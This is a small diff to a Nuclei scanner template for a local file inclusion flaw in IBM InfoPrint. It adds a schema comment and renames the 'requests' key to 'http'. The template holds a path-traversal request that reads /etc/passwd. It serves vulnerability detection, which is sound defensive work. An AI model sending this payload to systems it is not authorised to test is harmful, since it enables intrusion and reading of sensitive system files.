@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ibm-infoprint-lfi
 
 info:
@@ -8,7 +9,7 @@ info:
   reference: https://www.exploit-db.com/exploits/47835
   tags: ibm,lfi
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
